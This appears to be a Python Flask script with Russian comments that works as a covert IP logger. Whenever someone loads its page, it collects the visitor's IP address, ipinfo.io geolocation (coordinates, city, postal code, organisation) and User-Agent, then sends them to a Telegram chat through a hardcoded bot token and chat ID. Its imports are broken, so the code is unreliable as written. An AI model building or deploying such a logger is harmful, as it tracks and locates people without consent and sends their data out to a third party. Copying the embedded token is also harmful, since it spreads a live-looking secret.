import Flask
import request
import requests
import telegram

app = Flask(__name__)

# Настройки Telegram бота
bot_token = '7683343482:AAGWsiV8hCj9mt1kWT5YACm4ycFNmykyLcw'
chat_id = '1200755705'

# Функция для отправки сообщения через Telegram
def send_telegram_message(message):
    bot = telegram.Bot(token=bot_token)
    bot.send_message(chat_id=chat_id, text=message)

@app.route('/')
def index():
    # Получаем IP пользователя
    user_ip = request.remote_addr

    # Получаем геопозицию и информацию через сервис ipinfo.io
    geo_info = requests.get(f'http://ipinfo.io/{user_ip}/json').json()

    # Извлекаем информацию
    ip = geo_info.get("ip", "Неизвестно")
    city = geo_info.get("city", "Неизвестно")
    region = geo_info.get("region", "Неизвестно")
    country = geo_info.get("country", "Неизвестно")
    org = geo_info.get("org", "Неизвестно")
    loc = geo_info.get("loc", "Неизвестно")  # Широта и долгота
    postal = geo_info.get("postal", "Неизвестно")

    # Информация о браузере и операционной системе
    user_agent = request.headers.get('User-Agent', 'Неизвестно')

    # Формируем сообщение с максимальной информацией
    message = (
        f"IP пользователя: {ip}\n"
        f"Город: {city}\n"
        f"Регион: {region}\n"
        f"Страна: {country}\n"
        f"Организация: {org}\n"
        f"Местоположение (широта, долгота): {loc}\n"
        f"Почтовый индекс: {postal}\n"
        f"User-Agent (информация о браузере и ОС): {user_agent}"
    )

    # Отправляем сообщение в Telegram
    send_telegram_message(message)

    return "Данные отправлены боту!"

if __name__ == "__main__":
    app.run(debug=False, host='0.0.0.0')
